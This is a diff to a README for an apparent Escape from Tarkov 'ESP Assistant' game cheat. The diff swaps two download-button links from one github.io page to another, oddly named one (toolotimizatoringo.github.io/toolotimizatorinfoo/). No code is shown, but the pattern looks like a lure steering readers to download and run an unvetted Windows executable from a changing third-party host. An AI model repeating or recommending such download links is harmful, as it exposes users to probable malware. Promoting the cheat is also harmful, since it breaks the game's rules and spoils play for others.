@@ -1,7 +1,7 @@
 # 🎯 Escape from Tarkov — ESP Assistant (Setup Manual)
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://eft-esp-tool.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=windows)](https://eft-esp-tool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://toolotimizatoringo.github.io/toolotimizatorinfoo/)
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=windows)](https://toolotimizatoringo.github.io/toolotimizatorinfoo/)
 
 ---
 
